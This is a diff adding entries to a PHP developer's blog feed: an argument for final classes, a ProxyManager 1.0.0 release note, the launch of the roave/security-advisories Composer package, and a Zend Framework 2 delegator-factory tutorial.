+      <p>
+        This is, without any doubts, how you should <strong>NOT</strong> design your code. 
+      </p>
+
+      <p>
+        The approach described above is usually adopted by developers who confuse 
+        <a href="http://c2.com/cgi/wiki?AlanKaysDefinitionOfObjectOriented" target="_blank">
+          <abbr title="Object Oriented Programming">OOP</abbr>
+        </a> with "<cite>a way of solving problems via inheritance</cite>"
+        ("inheritance-oriented-programming", maybe?).
+      </p>
+
+      <h4>2. Encouraging composition</h4>
+
+      <p>
+        In general, preventing inheritance in a forceful way (by default) has the nice advantage of making developers 
+        think more about composition.
+      </p>
+
+      <p>
+        There will be less stuffing functionality in existing code via inheritance, which, in my
+        opinion, is a symptom of haste combined with 
+        <a href="https://en.wikipedia.org/wiki/Feature_creep" target="_blank">feature creep</a>.
+      </p>
+
+      <p>
+        Take the following naive example:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class RegistrationService implements RegistrationServiceInterface
+          {
+          public function registerUser(/* ... */) { /* ... */ }
+          }
+
+          class EmailingRegistrationService extends RegistrationService
+          {
+          public function registerUser(/* ... */) 
+          {
+          $user = parent::registerUser(/* ... */);
+
+          $this-&gt;sendTheRegistrationMail($user);
+
+          return $user;
+          }
+
+          // ...
+          }
+      </code></pre>
+
+      <p>
+        By making the <code>RegistrationService</code> <code>final</code>, the idea behind 
+        <code>EmailingRegistrationService</code> being a child-class of it is denied upfront, and silly mistakes such 
+        as the previously shown one are easily avoided:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          final class EmailingRegistrationService implements RegistrationServiceInterface
+          {
+          public function __construct(RegistrationServiceInterface $mainRegistrationService) 
+          {
+          $this-&gt;mainRegistrationService = $mainRegistrationService;
+          }
+
+          public function registerUser(/* ... */) 
+          {
+          $user = $this-&gt;mainRegistrationService-&gt;registerUser(/* ... */);
+
+          $this-&gt;sendTheRegistrationMail($user);
+
+          return $user;
+          }
+
+          // ...
+          }
+      </code></pre>
+
+      <h4>3. Force the developer to think about user public API</h4>
+
+      <p>
+        Developers tend to use inheritance to add accessors and additional API to existing classes:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class RegistrationService implements RegistrationServiceInterface
+          {
+          protected $db;
+
+          public function __construct(DbConnectionInterface $db) 
+          {
+          $this-&gt;db = $db;
+          }
+
+          public function registerUser(/* ... */) 
+          {
+          // ...
+
+          $this-&gt;db-&gt;insert($userData);
+
+          // ...
+          }
+          }
+
+          class SwitchableDbRegistrationService extends RegistrationService
+          {
+          public function setDb(DbConnectionInterface $db)
+          {
+          $this-&gt;db = $db;
+          }
+          }
+      </code></pre>
+
+      <p>
+        This example shows a set of flaws in the thought-process that led to the 
+        <code>SwitchableDbRegistrationService</code>:
+      </p>
+
+      <ul>
+        <li>
+          The <code>setDb</code> method is used to change the <code>DbConnectionInterface</code> at runtime, which seems
+          to hide a different problem being solved: maybe we need a <code>MasterSlaveConnection</code> instead?
+        </li>
+        <li>
+          The <code>setDb</code> method is not covered by the <code>RegistrationServiceInterface</code>, therefore
+          we can only use it when we strictly couple our code with the <code>SwitchableDbRegistrationService</code>,
+          which defeats the purpose of the contract itself in some contexts.
+        </li>
+        <li>
+          The <code>setDb</code> method changes dependencies at runtime, and that may not be supported
+          by the <code>RegistrationService</code> logic, and may as well lead to bugs.
+        </li>
+        <li>
+          Maybe the <code>setDb</code> method was introduced because of a bug in the original implementation: why
+          was the fix provided this way? Is it an actual fix or does it only fix a symptom?
+        </li>
+      </ul>
+
+      <p>
+        There are more issues with the <code>setDb</code> example, but these are the most relevant ones for our purpose
+        of explaining why <code>final</code> would have prevented this sort of situation upfront.
+      </p>
+
+      <h4>4. Force the developer to shrink an object's public API</h4>
+
+      <p>
+        Since classes with a lot of public methods are very likely to break the 
+        <abbr title="Single Responsibility Principle">SRP</abbr>, it is often true that a developer will want to override
+        specific API of those classes.
+      </p>
+
+      <p>
+        Starting to make every new implementation <code>final</code> forces the developer to think about new APIs upfront,
+        and about keeping them as small as possible.
+      </p>
+
+      <h4>5. A <code>final</code> class can always be made extensible</h4>
+
+      <p>
+        Coding a new class as <code>final</code> also means that you can make it extensible at any point in time (if really
+        required).
+      </p>
+
+      <p>
+        No drawbacks, but you will have to explain your reasoning for such change to yourself and other members 
+        in your team, and that discussion may lead to better solutions before anything gets merged.
+      </p>
+
+      <h4>6. <code>extends</code> breaks encapsulation</h4>
+
+      <p>
+        Unless the author of a class specifically designed it for extension, then you should consider it <code>final</code>
+        even if it isn't.
+      </p>
+
+      <p>
+        Extending a class breaks encapsulation, and can lead to unforeseen consequences and/or 
+        <abbr title="Backwards Compatibility">BC</abbr> breaks: think twice before using the <code>extends</code> keyword,
+        or better, make your classes <code>final</code> and avoid others from having to think about it.
+      </p>
+
+      <h4>7. You don't need that flexibility</h4>
+
+      <p>
+        One argument that I always have to counter is that <code>final</code> reduces flexibility of use of a codebase.
+      </p>
+
+      <p>
+        My counter-argument is very simple: you don't need that flexibility.
+      </p>
+
+      <p>
+        Why do you need it in first place?
+        Why can't you write your own customized implementation of a contract?
+        Why can't you use composition?
+        Did you carefully think about the problem?
+      </p>
+
+      <p>
+        If you still need to remove the <code>final</code> keyword from an implementation, then there may be some other 
+        sort of code-smell involved.
+      </p>
+
+      <h4>8. You are free to change the code</h4>
+
+      <p>
+        Once you made a class <code>final</code>, you can change it as much as it pleases you.
+      </p>
+
+      <p>
+        Since encapsulation is guaranteed to be maintained, the only thing that you have to care about is that the public API.
+      </p>
+
+      <p>
+        Now you are free to rewrite everything, as many times as you want.
+      </p>
+
+      <h3>When to <strong>avoid</strong> <code>final</code>:</h3>
+
+      <p>
+        Final classes <strong>only work effectively under following assumptions</strong>:
+      </p>
+
+      <ol>
+        <li>There is an abstraction (interface) that the final class implements</li>
+        <li>All of the public API of the final class is part of that interface</li>
+      </ol>
+
+      <p>
+        If one of these two pre-conditions is missing, then you will likely reach a point in time when you will make the
+        class extensible, as your code is not truly relying on abstractions.
+      </p>
+
+      <p>
+        An exception can be made if a particular class represents a set of constraints or concepts that are totally 
+        immutable, inflexible and global to an entire system.
+        A good example is a mathematical operation: <code>$calculator->sum($a, $b)</code> will unlikely change over time.
+        In these cases, it is safe to assume that we can use the <code>final</code> keyword without an abstraction to 
+        rely on first.
+      </p>
+
+      <p>
+        Another case where you do not want to use the <code>final</code> keyword is on existing classes: that can only
+        be done if you follow <a href="http://semver.org/" target="_blank">semver</a> and you bump the major version
+        for the affected codebase.
+      </p>
+
+      <h3>Try it out!</h3>
+
+      <p>
+        After having read this article, consider going back to your code, and if you never did so,
+        adding your first <code>final</code> marker to a class that you are planning to implement.
+      </p>
+
+      <p>
+        You will see the rest just getting in place as expected.
+      </p>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[ProxyManager 1.0.0 release and expected 1.x lifetime]]></title>
+    <link href="https://ocramius.github.io/blog/proxy-manager-1-0-0-release"/>
+    <updated>2014-12-12T00:00:00+01:00</updated>
+    <id>https://ocramius.github.io/blog/proxy-manager-1-0-0-release</id>
+    <content type="html"><![CDATA[<p style="align: center;">
+        <img
+          src="https://raw.githubusercontent.com/Ocramius/ProxyManager/1.0.0/proxy-manager.png"
+          alt="ProxyManager"
+          width="25%"
+          />
+      </p>
+
+      <p>
+        Today I finally released version 
+        <a href="https://github.com/Ocramius/ProxyManager/releases/tag/1.0.0" target="_blank">1.0.0</a> of the 
+        <a href="https://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
+      </p>
+
+      <h3>Noticeable improvements since 0.5.2:</h3>
+
+      <ul>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/pull/108" target="_blank">
+            Windows path length limitations are now mitigated
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/pull/172" target="_blank">
+            Proxy classes are now re-generated when the library version changes
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/pull/182" target="_blank">
+            Documentation has been moved to github pages
+          </a> (Markdown documentation will be kept in sync)
+        </li>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/pull/194" target="_blank">
+            It is not possible to trigger fatal errors via code-generation anymore
+          </a>
+        </li>
+      </ul>
+
+      <h3>Planned maintenance schedule</h3>
+
+      <p>
+        ProxyManager 1.x will be a maintenance-release only:
+      </p>
+
+      <ul>
+        <li>
+          I plan to fix bugs until <time datetime="2015-12-11">December 11, 2015</time>
+        </li>
+        <li>
+          I plan to fix security issues until <time datetime="2016-12-11">December 11, 2016</time>
+        </li>
+      </ul>
+
+      <p>
+        No features are going to be added to ProxyManager 1.x: the current <code>master</code> branch will instead
+        become the development branch for version <code>2.0.0</code>.
+      </p>
+
+      <h3>ProxyManager 2.0.0 targets</h3>
+
+      <p>
+        ProxyManager 2.0.0 has following main aims:
+      </p>
+
+      <ul>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/issues/167" target="_blank">
+            Drop PHP 5.3, 5.4 and HHVM 3.3 limitations, aiming only at next-generation PHP runtimes
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/issues/159" target="_blank">
+            Lazy Loading ghost objects should be property-based, even for private properties
+          </a>
+        </li>
+        <li>
+          Move documentation to RST, eventually using <a href="https://github.com/CouscousPHP" target="_blank">couscous</a>
+        </li>
+        <li>
+          <a href="https://github.com/Ocramius/ProxyManager/issues/115" target="_blank">
+            Complete
+            <abbr title="Liskov substitution principle">LSP</abbr>
+            compliance by avoiding overriding constructors in proxies
+          </a>
+        </li>
+        <li>
+          Compatibility with 
+          <a href="https://github.com/doctrine/common/blob/559a805125524b0bb6742638784c2979a5c5e607/lib/Doctrine/Common/Proxy/AbstractProxyFactory.php" target="_blank">
+            <code>Doctrine\Common\Proxy\AbstractProxyFactory</code>
+          </a> to improve doctrine proxy logic in next generation data mappers
+        </li>
+        <li>
+          Prototypal inheritance in PHP, which 
+          <a href="https://github.com/Ocramius/ProxyManager/pull/103" target="_blank">was left un-merged</a>
+          for a long time, and will likely be moved to a different library
+        </li>
+      </ul>
+
+      <h3>Thank you!</h3>
+
+      <p>
+        It wouldn't be a good 1.0.0 release without thanking all the contributors that helped with the project, 
+        by providing patches, bug reports and their useful insights to the project. Here are the most notable ones: 
+      </p>
+
+      <ul>
+        <li><a href="https://github.com/blanchonvincent" target="_blank">blanchonvincent</a></li>
+        <li><a href="https://github.com/malukenho" target="_blank">malukenho</a></li>
+        <li><a href="https://github.com/staabm" target="_blank">staabm</a></li>
+        <li><a href="https://github.com/gws" target="_blank">gws</a></li>
+        <li><a href="https://github.com/leedavis81" target="_blank">leedavis81</a></li>
+        <li><a href="https://github.com/lisachenko" target="_blank">lisachenko</a></li>
+        <li><a href="https://github.com/Pittiplatsch" target="_blank">Pittiplatsch</a></li>
+      </ul>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[roave/security-advisories: Composer against Security Vulnerabilities]]></title>
+    <link href="https://ocramius.github.io/blog/roave-security-advisories-protect-against-composer-packages-with-security-issues"/>
+    <updated>2014-12-11T00:00:00+01:00</updated>
+    <id>https://ocramius.github.io/blog/roave-security-advisories-protect-against-composer-packages-with-security-issues</id>
+    <content type="html"><![CDATA[<p><hr/></p>
+
+      <p>
+        Since it's almost christmas, it's also time to release a new project!
+      </p>
+
+      <p>
+        The <a href="https://twitter.com/RoaveTeam" target="_blank">Roave Team</a> is pleased to announce the release of
+        <a href="https://github.com/Roave/SecurityAdvisories" target="_blank">roave/security-advisories</a>, a package
+        that keeps known security issues out of your project.
+      </p>
+
+      <p>
+        Before telling you more, go grab it:
+      </p>
+
+      <pre><code class="sh">mkdir roave-security-advisories-test
+          cd roave-security-advisories-test
+          curl -sS https://getcomposer.org/installer | php --
+
+          ./composer.phar require roave/security-advisories:dev-master
+      </code></pre>
+
+      <p>
+        Hold on: I will tell you what to do with it in a few.
+      </p>
+
+      <h3>What is it?</h3>
+
+      <p>
+        <a href="https://github.com/Roave/SecurityAdvisories" target="_blank">roave/security-advisories</a> is a composer
+        package that prevents installation of packages with known security issues.
+      </p>
+
+      <h3>Yet another one?</h3>
+
+      <p>
+        Last year, <a href="https://twitter.com/fabpot" target="_blank">Fabien Potencier</a> 
+        <a href="http://fabien.potencier.org/article/67/don-t-use-php-libraries-with-known-security-issues" target="_blank">announced</a>
+        the <a href="https://security.sensiolabs.org/" target="_blank">security.sensiolabs.org</a> project.
+        This october, he 
+        <a href="http://fabien.potencier.org/article/74/the-php-security-advisories-database" target="_blank">announced again</a> 
+        that the project was being moved 
+        <a href="https://github.com/FriendsOfPHP/security-advisories" target="_blank">to the open-source FriendsOfPHP organization</a>.
+      </p>
+
+      <p>
+        While I like the idea of integrating security checks with my 
+        <abbr title="Continuous Integration">CI</abbr>, I don't like the fact that it is possible to install
+        and run harmful software before those checks.
+        <br/>
+        I also don't want to install and run an additional CLI tool for something that composer can provide directly.
+      </p>
+
+      <p>
+        That's why I had the idea of just compiling a list of <code>conflict</code> versions from 
+        <a href="https://github.com/FriendsOfPHP/security-advisories" target="_blank"></a> into a composer
+        <a href="https://getcomposer.org/doc/04-schema.md#type" target="_blank">metapackage</a>:
+      </p>
+
+      <iframe width="420" height="315" src="https://www.youtube.com/embed/QkjD3D5FgmE" frameborder="0" allowfullscreen></iframe>
+
+      <h3>Why?</h3>
+
+      <p>
+        This has various advantages:
+      </p>
+
+      <ul>
+        <li>
+          No files or actual dependencies are added to the project, since a "metapackage" does not provide 
+          a vendor directory by itself
+        </li>
+        <li>
+          Packages with security issues are filtered out during dependency resolution: they will not even be downloaded
+        </li>
+        <li>
+          No more CLI tool to run separately, no more <abbr title="Continuous Integration">CI</abbr> setup steps
+        </li>
+        <li>
+          No need to upgrade the tool separately
+        </li>
+        <li>
+          No coupling or version constraints with any dependencies used by similar CLI-based alternatives
+        </li>
+      </ul>
+
+      <h3>Try it out!</h3>
+
+      <p>
+        Now that you installed <code>roave/security-advisories</code>, you can try out how it works:
+      </p>
+
+      <pre><code class="sh">cd roave-security-advisories-test
+
+          ./composer.phar require symfony/symfony:2.5.2 # this will fail
+          ./composer.phar require zendframework/zendframework:2.3.1 # this will fail
+          ./composer.phar require symfony/symfony:~2.6 # works!
+          ./composer.phar require zendframework/zendframework:~2.3 # works!
+      </code></pre>
+
+      <p>
+        Simple enough!
+      </p>
+
+      <p>
+        Please just note that this only works when adding new dependencies or when running <code>composer update</code>:
+        security issues in your <code>composer.lock</code> cannot be checked with this technique.
+      </p>
+
+      <h3>Why is there no tagged version?</h3>
+
+      <p>
+        Because of how composer dependency resolution works, it is not possible to have more than one version of 
+        <code>roave/security-advisories</code> other than <code>dev-master</code>. More about this is on the 
+        <a href="https://github.com/Roave/SecurityAdvisories" target="_blank">project page</a>
+      </p>
+
+      <hr/>
+
+      <h2>Fin</h2>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[Delegator Factories in Zend Framework 2]]></title>
+    <link href="https://ocramius.github.io/blog/zend-framework-2-delegator-factories-explained"/>
+    <updated>2014-03-16T00:00:00+01:00</updated>
+    <id>https://ocramius.github.io/blog/zend-framework-2-delegator-factories-explained</id>
+    <content type="html"><![CDATA[<p>
+        Last year, I
+        <a href="https://github.com/zendframework/zf2/pull/4145" target="_blank">worked on a feature</a>
+        for ZF2 called
+        <a href="https://framework.zend.com/manual/2.3/en/modules/zend.service-manager.delegator-factories.html" target="_blank">
+          "Delegator Service Factories"
+        </a>, which was included in Zend Framework 2.2.0.
+      </p>
+
+      <p>
+        It seems to me that many ZF2 developers either don't fully understand the feature,
+        or do not know it.
+      </p>
+
+      <p>
+        This article analyzes the feature in depth and tries to explain what these do, and why you may need them.
+      </p>
+
+      <hr/>
+
+      <h2>The Problem</h2>
+
+      <p>
+        While working with <code>Zend\ServiceManager</code>, we often find ourselves in the need
+        of overriding services provided by third-party modules that we use.
+      </p>
+
+      <p>
+        Let's make a practical example and assume that we are using a <code>DbLoggingModule</code>.
+        provided by a friendly open-source developer.
+      </p>
+
+      <p>
+        The developer of <code>DbLoggingModule</code> provided us with an awesome service
+        called <code>"DbLoggingModule\Logger"</code>, which is created by a service factory
+        <code>DbLoggingModule\Factory\LoggerFactory</code>:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class LoggerFactory implements FactoryInterface
+          {
+          public function createService(ServiceLocatorInterface $sm)
+          {
+          $config = $sm-&gt;get('Config');
+          $db     = new DB($config['db_logging']['dsn']);
+
+          // more db configuration here
+
+          $logger = new Logger($db);
+
+          $logger-&gt;addFilter(new ErrorFilter());
+
+          // more logger configuration here
+
+          return $logger;
+          }
+          }
+      </code></pre>
+
+      <p>
+        This is awesome and clean, but then we want to be able to log all errors by
+        removing the pre-configured filters, or we want to add a formatter to our logger to add
+        contextual information to the logged messages.
+      </p>
+
+      <p>
+        This becomes tricky, since we now have to define our own factory for that logger:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class MyLoggerFactory implements FactoryInterface
+          {
+          public function createService(ServiceLocatorInterface $sl)
+          {
+          $config = $sl-&gt;get('Config');
+          $db     = new DB($config['db_logging']['dsn']);
+
+          // more db configuration here
+
+          $logger = new Logger($db);
+
+          // removing this: we don't filters
+          // $logger-&gt;addFilter(new ErrorFilter());
+
+          // this will add some context from the HTTP globals
+          // ("eeew", but useful for our logged messages)
+          $logger-&gt;addFormatter(new HttpRequestContextFormatter());
+
+          // more logger configuration here
+
+          return $logger;
+          }
+          }
+      </code></pre>
+
+      <p>
+        This is fine, but our <code>MyLoggerFactory</code> <strong>duplicates a lot of code</strong> from
+        <code>LoggerFactory</code>, and we now have to also strictly monitor any updates
+        by the original developer of <code>DbLoggingModule</code>.
+      </p>
+
+      <p class="alert alert-danger">
+        Code duplication is a huge problem, especially when we're localizing
+        code from external dependencies.
+      </p>
+
+      <p>
+        We can mitigate this issue by using an initializer instead:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class MyLoggerInitializer implements InitializerInterface
+          {
+          public function initialize($instance, ServiceLocatorInterface $sl)
+          {
+          if ($instance instanceof Logger) {
+          $logger-&gt;clearFilters();
+          $logger-&gt;addFormatter(new HttpRequestContextFormatter());
+          }
+          }
+          }
+      </code></pre>
+
+      <p>
+        This is a much cleaner approach, but there are major disadvantages as well:
+      </p>
+
+      <ul>
+        <li>
+          This initializer is being called <strong>once per each instantiated service</strong>,
+          and that can lead to hundreds (seriously!) of useless method calls per request,
+          and that for a single object that we wanted to change.
+        </li>
+        <li>
+          <strong>All</strong> of our <code>Logger</code> instances are going to be affected
+          by the change, and that is a big problem if we have more than one logger in the
+          application.
+        </li>
+      </ul>
+
+      <p class="alert alert-danger">
+        That's pretty much <strong>technical debt</strong> that we are building up.
+        We are being lazy, and we will pay for that if we go down this route.
+      </p>
+
+      <p>
+        The solution for this particular problem is using "delegator factories".
+      </p>
+
+      <hr/>
+
+      <h2>What are delegator factories?</h2>
+
+      <p class="alert alert-success">
+        A delegator factory is pretty much a wrapper around a real factory: it allows us
+        to either replace the real service with a "delegate", or interact with an object
+        produced by a factory before it is returned by the <code>Zend\ServiceManager</code>.
+      </p>
+
+      <p>
+        In pseudo-code, a delegator-factory is doing following:
+      </p>
+
+      <pre><code class="javascript">service = delegatorFactory(factory());
+      </code></pre>
+
+      <p>
+        This is the interface for a delegator factory:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          namespace Zend\ServiceManager;
+
+          interface DelegatorFactoryInterface
+          {
+          public function createDelegatorWithName(
+          ServiceLocatorInterface $serviceLocator,
+          $name,
+          $requestedName,
+          $callback
+          );
+          }
+      </code></pre>
+
+      <hr/>
+
+      <h2>Delegator Factories applied to the Logger problem</h2>
+
+      <p>
+        This is how we would use it to modify our <code>"DbLoggingModule\Logger"</code> service:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class LoggerDelegatorFactory implements DelegatorFactoryInterface
+          {
+          public function createDelegatorWithName(
+          ServiceLocatorInterface $serviceLocator,
+          $name,
+          $requestedName,
+          $callback
+          ) {
+          $logger = $callback();
+
+          $logger-&gt;clearFilters();
+          $logger-&gt;addFormatter(new HttpRequestContextFormatter());
+
+          return $logger;
+          }
+          }
+      </code></pre>
+
+      <p class="alert alert-info">
+        <span class="label label-info">Note:</span> We are not using the first 3 parameters,
+        which may be useful in different contexts (for example, when configuration is needed).
+      </p>
+
+      <p>
+        We then add it to our service manager configuration to instruct the
+        <code>Zend\ServiceManager</code> that we want our delegator factory to be used
+        whenever the service <code>"DbLoggingModule\Logger"</code> is requested:
+      </p>
+
+      <pre><code class="php">&lt;?php
+          return [
+          'delegators' =&gt; [
+          'DbLoggingModule\Logger' =&gt; [
+          'LoggerDelegatorFactory',
+          // can add more of these delegator factories here
+          ],
+          ],
+          ];
+      </code></pre>
+
+      <p>
+        This will make the <code>Zend\ServiceManager</code> call the the
+        <code>LoggerDelegatorFactory#createDelegatorWithName()</code> method
+        whenever the service <code>"DbLoggingModule\Logger"</code> is instantiated,
+        regardless if it is built via invokable, factory, peering service manager or
+        abstract factory.
+      </p>
+
+      <p class="alert alert-info">
+        <span class="label label-info">Hint:</span> You can define more of these delegator
+        service factories for a single service, which allow you to override service
+        instantiation logic in different modules and multiple
+        times, leading to a very fine-grained configuration flexibility.
+      </p>
+
+      <p class="alert alert-info">
+        <span class="label label-info">Hint:</span> Assuming that you want to completely replace the
+        <code>"DbLoggingModule\Logger"</code> with your own custom implementation depending on
+        context, you could also completely avoid using the provided <code>$callback</code>.
+        This way, the original service won't even be instantiated.
+      </p>
+
+      <h2>On naming</h2>
+
+      <p>
+        The name <q>delegator factory</q> is actually something I'm not happy with, since
+        they are actually just wrappers around an existing factory.
+      </p>
+
+      <p class="alert alert-error">
+        <span class="label label-warning">Warning:</span> Since I'm the first guy
+        <a href="https://twitter.com/Ocramius/status/441673095662018561" target="_blank">to shout out at Laravel Facades</a>,
+        I want to make it clear that the naming "Delegator Factory" is wrong, that
+        it was my mistake, and I will likely fix it for ZendFramework 3.x.
+      </p>
+
+      <p>
+        I initially designed these factories to solve a different problem, which is
+        <a href="https://framework.zend.com/manual/2.3/en/modules/zend.service-manager.lazy-services.html" target="_blank">Lazy Services</a>.
+      </p>
+
+      <p>
+        In the context of lazy services and decorators, the instance returned by these factories
+        is indeed a
+        "<a href="https://en.wikipedia.org/wiki/Delegation_pattern" target="_blank">delegate</a>",
+        therefore I came up with the name "delegator factory".
+      </p>
+
+      <p>
+        Only later on I realized that these factories are actually much more powerful than
+        what I originally designed them for, therefore the "delegator factory" name became inadequate.
+      </p>
+
+      <hr/>
+
+      <h2>Conclusions</h2>
+
+      <p>
+        Delegator factories are vital to any ZF2 hacker. Any developer working with <code>Zend\ServiceManager</code>
+        should also be familiar with this functionality and its usage.
+      </p>
+
+      <p>
+        Delegator factories are not a new concept. For instance, Pimple introduced this concept
+        a while ago and (in a limited form): it is called
+        "<a href="https://github.com/fabpot/Pimple#modifying-services-after-creation" target="_blank">extending a service</a>".
+      </p>
+
+      <p>
+        The entire functionality was introduced by accident while I was working on an implementation of
+        <a href="https://ocramius.github.io/blog/zf2-and-symfony-service-proxies-with-doctrine-proxies/" target="_blank">Lazy Services</a>,
+        and they surely need a rename. This will not happen in Zend Framework 2.x.
+      </p>
+
+      <p>
+        I hope this helps you with your day-to-day hacking around your ZF2 apps!
+      </p>
+      ]]></content>
+  </entry>
+</feed>
